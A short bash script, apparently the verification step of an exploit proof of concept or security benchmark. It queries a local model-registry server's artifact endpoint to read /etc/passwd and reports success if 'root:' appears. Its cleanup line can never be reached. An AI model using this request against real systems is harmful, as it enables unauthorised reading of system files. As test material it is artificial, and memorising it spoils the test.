#!/bin/bash

cd ../exploit
# Load experiment and run IDs from the exploit script output
if [[ ! -f experiment_id.txt || ! -f run_id.txt ]]; then
  echo "Error: Experiment ID or Run ID files not found. Run the exploit script first."
  exit 1
fi

EXPERIMENT_ID=$(cat experiment_id.txt)
RUN_ID=$(cat run_id.txt)

# Step 6: Attempt to read /etc/passwd
echo "Attempting to read /etc/passwd using model artifact retrieval..."
RESPONSE=$(curl -s "http://127.0.0.1:5000/model-versions/get-artifact?path=passwd&name=poc&version=1")

if [[ "$RESPONSE" == *"root:"* ]]; then
  echo "true"
  exit 0
else
  echo "false"
  exit 1
fi

# Clean up generated files
rm -f experiment_id.txt run_id.txt